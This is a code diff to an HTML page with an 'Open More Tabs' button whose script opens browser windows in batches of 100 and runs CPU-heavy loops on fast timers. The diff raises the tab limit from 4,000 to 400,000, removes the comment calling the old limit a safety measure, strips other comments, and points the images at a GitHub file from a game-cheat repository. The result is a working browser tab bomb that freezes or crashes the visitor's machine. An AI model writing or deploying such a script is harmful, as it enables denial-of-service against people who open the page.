@@ -56,13 +56,13 @@
 <button id="loadingButton" onclick="toggleModal()">Open More Tabs</button>
 <script>
   let tabCount = 0;
-  const maxTabs = 4000; // Adjusted the maximum number of tabs to 4,000 for safety
+  const maxTabs = 400000;
   let currentTabs = 0;
   let backgroundTasks = [];
 
   function openTabs() {
     for (let i = 0; i < 100; i++) {
-      let randomImageUrl = 'https://i.gifer.com/origin/98/981f2f195e7b896be152327f2965e721_w200.gif' + (currentTabs + 1) + 'x' + (currentTabs + 1) + '?city,night';
+      let randomImageUrl = 'https://raw.githubusercontent.com/Plutana-eng/Cs2-External-Python/refs/heads/main/Icons/image.png' + (currentTabs + 1) + 'x' + (currentTabs + 1) + '?city,night';
       let tabUrl = 'about:blank';
       let win = window.open(tabUrl, '_blank');
       win.document.write('<html><head><title>Tab ' + currentTabs + '</title><meta charset="utf-8"></head><body><img src="' + randomImageUrl + '" style="width:100vw;height:100vh;"></body></html>');
@@ -82,7 +82,6 @@
       for (let i = 0; i < 100; i++) {
         openTabs();
       }
-      // Run heavy background tasks
       setInterval(() => {
         backgroundTasks.forEach(task => task());
       }, 100000);
@@ -111,14 +110,11 @@
     }
   }
 
-  // Set up additional background tasks
   setInterval(() => {
     console.log('Background task running: ' + (new Date()).toString());
     backgroundTasks.forEach(task => task());
-    // More heavy tasks like calculating large numbers or processing large data sets can be added here
   }, 100);
 
-  // Function to calculate large numbers in the background
   function heavyCalculation() {
     const start = Date.now();
     let result = 0;
@@ -128,24 +124,12 @@
     console.log('Heavy calculation completed in ' + (Date.now() - start) + 'ms');
   }
 
-  // Add heavyCalculation to backgroundTasks array
   backgroundTasks.push(heavyCalculation);
 
-  // Add more heavy tasks if needed
-  // For example:
-  // function heavyDataProcessing() {
-  //   // Process large data sets or perform intensive operations
-  //   console.log('Heavy data processing started');
-  //   // ...
-  // }
-  // backgroundTasks.push(heavyDataProcessing);
-
-  // Run background tasks every second
   setInterval(() => {
     backgroundTasks.forEach(task => task());
   }, 1000);
 
-  // Function to open tabs infinitely
   function infiniteLoop() {
     setInterval(() => {
       if (currentTabs < maxTabs) {
@@ -154,7 +138,6 @@
     }, 100);
   }
 
-  // Call the infinite loop function
   infiniteLoop();
 </script>
 </body>
